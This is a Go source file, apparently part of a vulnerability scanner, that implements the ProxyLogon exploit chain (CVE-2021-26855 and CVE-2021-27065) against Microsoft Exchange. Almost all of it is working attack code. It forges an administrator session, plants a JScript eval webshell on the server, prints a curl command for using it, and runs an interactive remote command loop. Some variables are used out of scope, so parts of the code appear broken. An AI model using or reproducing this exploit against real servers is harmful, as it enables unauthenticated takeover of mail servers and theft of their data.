package exchange

// chained CVE-2021-26855(bypassing the authentication and impersonating as the admin),CVE-2021-27065(post-auth arbitrary-file-write)
// an unauthenticated attacker can execute arbitrary commands on Microsoft Exchange Server through an only opened 443 port!

import (
	"bufio"
	"crypto/tls"
	"errors"
	"fmt"
	"github.com/GhostTroops/scan4all/lib/util"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func splitsid(sid string) string {
	sid1 := strings.Split(sid, "-")
	sid2 := sid1[len(sid1)-1]
	return sid2
}

func modifysid(sid string) string {
	sid1 := strings.Split(sid, "-")
	sid2 := sid1[len(sid1)-1]
	sid3 := strings.Split(sid, sid2)
	sid4 := sid3[0] + "500"
	return sid4
}

func splitsess(sess string) string {
	sess1 := strings.Split(sess, "ASP.NET_SessionId=")
	sess2 := sess1[len(sess1)-1]
	sess3 := strings.Split(sess2, ";")
	sess4 := sess3[0]

	return sess4
}

func splitmsexch(msexch string) string {
	msexch1 := strings.Split(msexch, "msExchEcpCanary=")
	msexch2 := msexch1[len(msexch1)-1]
	msexch3 := strings.Split(msexch2, ";")
	msexch4 := msexch3[0]

	return msexch4
}

func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

// 声明两个新的错误返回
var ErrNotPath = errors.New("Path Required")
var ErrRegexp = errors.New("Regexp Fail")

func execShell(input string) error {
	// 去除输入中最后的换行
	input = strings.TrimSuffix(input, "\n")

	// 去除输入前后的空格
	input = strings.TrimSpace(input)

	// 正则匹配输入字符中连续多个空格替换为一个空格
	r, err := regexp.Compile(" +")
	if err != nil {
		return ErrRegexp
	}
	input = r.ReplaceAllString(input, " ")

	args := strings.Split(input, " ")

	// 判断用户输入是否为cd
	switch args[0] {
	case "cd":
		if len(args) < 2 {
			return ErrNotPath
		}
		return os.Chdir(args[1])

	case "exit":
		os.Exit(0)
	}

	cmd := exec.Command(args[0], args[1:]...)

	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	return cmd.Run()
}

func splitBackEnd(sess string) string {
	sess1 := strings.Split(sess, "X-BackEndCookie=")
	sess2 := sess1[len(sess1)-1]
	sess3 := strings.Split(sess2, "; ")
	sess4 := sess3[0]

	return sess4
}

func splitMasterAccountSid(sess string) string {
	sess1 := strings.Split(sess, "with SID ")
	sess2 := sess1[len(sess1)-1]
	sess3 := strings.Split(sess2, " and MasterAccountSid")
	sess4 := sess3[0]

	return sess4
}

func getshell(target, mail, FQDN, sid string) {
	// shell_absolute_path1 := "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\lUc1f3r11.aspx"
	// shell_absolute_path2 := "\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\lUc1f3r11.aspx"
	shell_name := "lUc1f3r11.aspx"
	shell_payload := `%3Cscript%20language%3D%22JScript%22%20runat%3D%22server%22%3E%20function%20Page_Load%28%29%7B%2F%2A%2A%2Feval%28Request%5B%22lUc1f3r11%22%5D%2C%22unsafe%22%29%3B%7D%3C%2Fscript%3E`
	random_name := strconv.FormatInt(int64(rand.New(rand.NewSource(time.Now().UnixNano())).Int31n(1000)), 10) + ".js"
	user_agent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
	json := `{"filter": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}}`

	if splitsid(sid) != "500" {
		sid = modifysid(sid)
	}
	fmt.Println("[+] Fixed User SID: " + sid)

	proxyLogon_request := `<r at="Negotiate" ln="john"><s>` + sid + `</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>`

	/*构造payload*/

	cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}
	if c1 := util.GetClient(target + "/ecp/" + random_name); nil != c1 {
		c1.DoGetWithClient4SetHd(nil, target+"/ecp/"+random_name, http.MethodPost, strings.NewReader(proxyLogon_request), func(do *http.Response, err error, szU string) {
			if nil != do && 2 <= len(do.Header["Set-Cookie"]) {
				sess_id := splitsess(do.Header["Set-Cookie"][0])
				msExchEcpCanary := splitmsexch(do.Header["Set-Cookie"][1])
				fmt.Println("[+] Login success!!!")
				fmt.Println("[+] ASP.NET_SessionId=" + sess_id + "; msExchEcpCanary=" + msExchEcpCanary)
				if c2 := util.GetClient(target + "/ecp/" + random_name); nil != c2 {
					c2.DoGetWithClient4SetHd(c1.Client, target+"/ecp/"+random_name, http.MethodPost, strings.NewReader(""), func(resp *http.Response, err error, szU string) {
						if resp != nil && resp.StatusCode == 200 {

						}
					}, func() map[string]string {
						return map[string]string{
							"Cookie":              "X-BEResource=Admin@" + FQDN + ":444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=" + sess_id + "; msExchEcpCanary=" + msExchEcpCanary,
							"msExchLogonAccount":  sid,
							"msExchLogonMailbox":  sid,
							"msExchTargetMailbox": sid,
							"User-Agent":          user_agent,
						}
					}, true)
				}
			}
		}, func() map[string]string {
			return map[string]string{
				"Cookie":              "X-BEResource=Admin@" + FQDN + ":444/ecp/proxyLogon.ecp?a=~1942062522;",
				"Content-Type":        "text/xml",
				"msExchLogonAccount":  sid,
				"msExchLogonMailbox":  sid,
				"msExchTargetMailbox": sid,
				"User-Agent":          user_agent,
			}
		}, true)
	}

	request2, err := http.NewRequest(http.MethodPost, target+"/ecp/"+random_name, strings.NewReader(json))
	if err != nil {
		fmt.Println(err)
	}

	request2.Header.Add("Cookie", "X-BEResource=Admin@"+FQDN+":444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary="+msExchEcpCanary+"&a=~1942062522; ASP.NET_SessionId="+sess_id+"; msExchEcpCanary="+msExchEcpCanary)
	request2.Header.Add("Content-Type", "application/json; charset=utf-8")
	request2.Header.Add("msExchLogonAccount", sid)
	request2.Header.Add("msExchLogonMailbox", sid)
	request2.Header.Add("msExchTargetMailbox", sid)
	request2.Header.Add("User-Agent", user_agent)

	do2, err := cli.Do(request2)
	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}
	if do2.StatusCode != 200 {
		fmt.Println("[-] GetOAB Error!")
	} else {
		fmt.Println("[+] GetOAB success!")
	}

	ioread, _ := ioutil.ReadAll(do2.Body)

	oabId := Between(string(ioread), `"RawIdentity":"`, `"`)
	fmt.Println("[+] Got OAB id: " + oabId)
	oab_json := `{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": "` + oabId + `"}, "properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "ExternalUrl": "http://ffff/#` + shell_payload + `"}}}`
	request3, err := http.NewRequest(http.MethodPost, target+"/ecp/"+random_name, strings.NewReader(oab_json))
	if err != nil {
		fmt.Println(err)
	}

	request3.Header.Add("Cookie", "X-BEResource=Admin@"+FQDN+":444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary="+msExchEcpCanary+"&a=~1942062522; ASP.NET_SessionId="+sess_id+"; msExchEcpCanary="+msExchEcpCanary)
	request3.Header.Add("Content-Type", "application/json; charset=utf-8")
	request3.Header.Add("msExchLogonAccount", sid)
	request3.Header.Add("msExchLogonMailbox", sid)
	request3.Header.Add("msExchTargetMailbox", sid)
	request3.Header.Add("User-Agent", user_agent)

	do3, err := cli.Do(request3)
	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	if do3.StatusCode != 200 {
		fmt.Println("[-] Set external url Error! target may have some anti defence...")
	} else {
		fmt.Println("[+] Set external url success!")
		reset_oab_body := `{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": "` + oabId + `"}, "properties": {"Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel", "FilePathName": "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\lUc1f3r11.aspx" }}}`
		request4, err := http.NewRequest(http.MethodPost, target+"/ecp/"+random_name, strings.NewReader(reset_oab_body))
		if err != nil {
			fmt.Println(err)
		}

		request4.Header.Add("Cookie", "X-BEResource=Admin@"+FQDN+":444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary="+msExchEcpCanary+"&a=~1942062522; ASP.NET_SessionId="+sess_id+"; msExchEcpCanary="+msExchEcpCanary)
		request4.Header.Add("Content-Type", "application/json; charset=utf-8")
		request4.Header.Add("msExchLogonAccount", sid)
		request4.Header.Add("msExchLogonMailbox", sid)
		request4.Header.Add("msExchTargetMailbox", sid)
		request4.Header.Add("User-Agent", user_agent)

		do4, err := cli.Do(request4)
		if err != nil {
			fmt.Println("[-] requesting err...")
			return
		}

		if do4.StatusCode != 200 {
			fmt.Println("[-] Write Shell Error!")
			read12, _ := ioutil.ReadAll(do4.Body)
			fmt.Println(string(read12))
		} else {
			fmt.Println("[+] Write Shell success!")
			shell_e := target + "/aspnet_client/" + shell_name
			requestshell, err := http.NewRequest(http.MethodGet, shell_e, strings.NewReader(""))
			if err != nil {
				panic(err)
			}

			do5, err := cli.Do(requestshell)
			if err != nil {
				fmt.Println("[-] requesting err...")
				return
			}

			if do5.StatusCode != 200 {
				fmt.Println("[-] requesting Shell Error! can not access the webshell! try again...")
			}

			s, _ := ioutil.ReadAll(do5.Body)
			fmt.Printf("[+] the request shell response data:\n" + string(s))
			if do5.StatusCode == 200 {
				fmt.Println("[+] Webshell drop at " + target + "/aspnet_client/" + shell_name + " .. Have fun!")
				fmt.Println("[+] Code: curl -ik " + target + "/aspnet_client/" + shell_name + ` -d 'lUc1f3r11=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c whoami").stdout.readall())'`)
				reader := bufio.NewReader(os.Stdin)
				for {
					fmt.Print("> ")
					input, err := reader.ReadString('\n')
					shell_body_exec := `lUc1f3r11=Response.Write(new ActiveXObject("WScript.Shell").exec("cmd /c ` + input + `").stdout.readall())`
					request5, err := http.NewRequest(http.MethodPost, target+"/aspnet_client/"+shell_name, strings.NewReader(shell_body_exec))
					if err != nil {
						fmt.Println(err)
					}
					request5.Header.Add("Content-Type", "application/x-www-form-urlencoded")
					request5.Header.Add("User-Agent", user_agent)

					do5, err := cli.Do(request5)
					if err != nil {
						fmt.Println("[-] requesting err...")
						return
					}
					if do5.StatusCode == 200 {
						readres, _ := ioutil.ReadAll(do5.Body)
						fmt.Println("[+] cmd exec results:")
						fmt.Println("-----------------------")
						fmt.Println(string(readres))
					} else if do5.StatusCode == 500 {
						fmt.Println("[-] AV block exec cmd!!")
					} else {
						fmt.Println("[-] Something wrong.. try again?")
					}
					if err = execShell(input); err != nil {
						fmt.Fprintln(os.Stderr, err)
					}
				}
			} else {
				fmt.Println("[+] Webshell not found due to Covid, try again!")
			}
		}
	}
}

func exploit(szUrl, email string) {
	if oU, err := url.Parse(szUrl); nil == err {
		szUrl = oU.Scheme + "://" + oU.Host
	}
	server := szUrl + "/owa/auth.owa"

	if c1 := util.GetClient(server); nil != c1 {
		c1.DoGetWithClient4SetHd(nil, server, http.MethodPost, strings.NewReader(""), func(do6 *http.Response, err error, szU string) {
			if do6.StatusCode == 400 {
				fmt.Println("[+] get FQDN success!")
				server_name := do6.Header["X-Feserver"][0]
				fmt.Println("[+] Got FQDN: " + server_name)
				path_maybe_vuln := "/ecp/pentest.js"
				payload := `<?xml version="1.0" encoding="utf-8"?>
		<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
		xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
		xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
		xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
			<soap:Body>
				<m:GetFolder>
					<m:FolderShape>
						<t:BaseShape>Default</t:BaseShape>
					</m:FolderShape>
					<m:FolderIds>
						<t:DistinguishedFolderId Id="inbox">
							<t:Mailbox>
								<t:EmailAddress>admin@domain.tld</t:EmailAddress>
							</t:Mailbox>
						</t:DistinguishedFolderId>
					</m:FolderIds>
				</m:GetFolder>
			</soap:Body>
		</soap:Envelope>`
				request7, err := http.NewRequest(http.MethodPost, szUrl+path_maybe_vuln, strings.NewReader(payload))
				if err != nil {
					fmt.Println(err)
				}

				request7.Header.Add("User-Agent", "Hello-World")
				request7.Header.Add("Cookie", "X-BEResource="+server_name+"/EWS/Exchange.asmx?a=~1942062522;")
				request7.Header.Add("Connection", "close")
				request7.Header.Add("Content-Type", "text/xml")

				do7, err := c.Do(request7)
				if err != nil {
					fmt.Println("[-] Hmm?, is that exchange server?")
					return
				}
				if do7.StatusCode == 200 {
					fmt.Println("[+] Target is Vuln to SSRF [CVE-2021-26855]!")
					fmt.Println("[+] Getting Information Server!")
					fmt.Printf("[+] Computer Name = ")
					fmt.Println(do7.Header["X-Diaginfo"][0])
					fmt.Println("[+] Domain Name = ")
					fmt.Println(do7.Header["X-Calculatedbetarget"][1])
					fmt.Println("[+] Guest SID = ")
					fmt.Println(splitBackEnd(do7.Header["Set-Cookie"][1]))

					autodiscover_payload := `<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
					<Request>
					  <EMailAddress>` + email + `</EMailAddress>
					  <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
					</Request>
				</Autodiscover>`
					request8, err := http.NewRequest(http.MethodPost, szUrl+path_maybe_vuln, strings.NewReader(autodiscover_payload))
					if err != nil {
						fmt.Println(err)
					}

					request8.Header.Add("User-Agent", "Hello-World")
					request8.Header.Add("Cookie", "X-BEResource=Admin@"+server_name+":444/autodiscover/autodiscover.xml?a=~1942062522;")
					request8.Header.Add("Connection", "close")
					request8.Header.Add("Content-Type", "text/xml")

					do8, err := c.Do(request8)
					if err != nil {
						fmt.Println("[-] Hmm?, is that exchange server?")
						return
					}
					res1, _ := ioutil.ReadAll(do8.Body)
					fmt.Println("[+] valid email: " + email)
					txtstr := string(res1)
					re, _ := regexp.Compile("(?:<LegacyDN>)(.+?)(?:</LegacyDN>)")
					match := re.FindString(txtstr)
					legacyDN1 := strings.ReplaceAll(match, "<LegacyDN>", "")
					legacyDN := strings.ReplaceAll(legacyDN1, "</LegacyDN>", "")
					fmt.Println("[+] legacyDN is: " + legacyDN)
					mapi_body := legacyDN + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
					request9, err := http.NewRequest(http.MethodPost, szUrl+path_maybe_vuln, strings.NewReader(mapi_body))
					if err != nil {
						fmt.Println(err)
					}

					request9.Header.Add("Cookie", "X-BEResource=Admin@"+server_name+":444/mapi/emsmdb?MailboxId="+server+"&a=~1942062522;")
					request9.Header.Add("Content-Type", "application/mapi-http")
					request9.Header.Add("X-Requesttype", "Connect")
					request9.Header.Add("X-Clientinfo", "{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}")
					request9.Header.Add("X-Clientapplication", "Outlook/15.0.4815.1002")
					request9.Header.Add("X-Requestid", "{C715155F-2BE8-44E0-BD34-2960067874C8}:500")
					request9.Header.Add("User-Agent", "Hello-World")

					do9, err := c.Do(request9)
					if err != nil {
						fmt.Println("[-] Hmm?, is that exchange server?")
						return
					}
					if do9.StatusCode != 200 {
						fmt.Println("[-] Cant leak User SID!!")
					} else {
						readres2, err := ioutil.ReadAll(do9.Body)
						if err == nil {
							sid := splitMasterAccountSid(string(readres2))
							fmt.Println("[+] Found User SID = " + sid)
							getshell(szUrl, email, server_name, sid)
						}
					}
				} else {
					fmt.Println("[-] Target is not Vuln to SSRF [CVE-2021-26855]!")
				}
			}
		}, func() map[string]string {
			return map[string]string{}
		}, true)
	}
}

func DoCheck(target, email string) {
	exploit(target, email)
}
